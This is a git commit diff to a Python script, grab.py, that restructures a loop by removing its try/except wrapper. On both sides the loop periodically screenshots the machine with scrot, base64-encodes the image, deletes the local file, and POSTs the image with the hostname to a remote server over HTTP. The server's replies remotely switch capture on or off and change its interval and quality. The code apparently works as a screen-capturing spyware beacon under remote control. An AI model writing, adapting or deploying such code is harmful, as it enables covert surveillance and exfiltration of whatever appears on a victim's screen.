70eb7a0359b05c8201b461c6acdf61d10b6df4f5
Ripjack <theranslinkard@gmail.com>
2018-03-20 14:53:41 -0500

    Signed-off-by: Ripjack <theranslinkard@gmail.com>

--- grab.py
+++ grab.py
@@ -16,31 +16,28 @@ thumb_perc = 50
 quality = 50
 headers = {'Content-type': 'application/json'}
 while arch:
-    try:
-        subprocess.run(['sleep', str(time)])
-        _obj = {
-            'hostname': hostname,
-            'file': ""
-        }
-        if en == True:
-            subprocess.run(['scrot', '--thumb', str(thumb_perc), '-q', str(quality), '{}.jpg'.format(hostname)])
-            with open('{}.jpg'.format(hostname), 'rb') as f:
-                img = f.read()
-                img = base64.b64encode(img).decode()
-                _obj['file'] = img
-            subprocess.run(['rm', '{}.jpg'.format(hostname)])
-        conn = http.HTTPConnection("{}:80".format(server_ip))
-        _obj = json.dumps(_obj)
-        _obj = _obj.encode()
-        conn.request("POST", server_path, _obj, headers)
-        json_flags = conn.getresponse().read().decode()
-        conn.close()
-        flags = json.loads(json_flags)
-        if 'en' in flags:
-            en = flags['en']
-        if 'time' in flags:
-            time = flags['time']
-        if 'quality' in flags:
-            thumb_perc = quality = flags['quality']
-    except:
-        pass
+    subprocess.run(['sleep', str(time)])
+    _obj = {
+        'hostname': hostname,
+        'file': ""
+    }
+    if en == True:
+        subprocess.run(['scrot', '--thumb', str(thumb_perc), '-q', str(quality), '{}.jpg'.format(hostname)])
+        with open('{}.jpg'.format(hostname), 'rb') as f:
+            img = f.read()
+            img = base64.b64encode(img).decode()
+            _obj['file'] = img
+        subprocess.run(['rm', '{}.jpg'.format(hostname)])
+    conn = http.HTTPConnection("{}:80".format(server_ip))
+    _obj = json.dumps(_obj)
+    _obj = _obj.encode()
+    conn.request("POST", server_path, _obj, headers)
+    json_flags = conn.getresponse().read().decode()
+    conn.close()
+    flags = json.loads(json_flags)
+    if 'en' in flags:
+        en = flags['en']
+    if 'time' in flags:
+        time = flags['time']
+    if 'quality' in flags:
+        thumb_perc = quality = flags['quality']
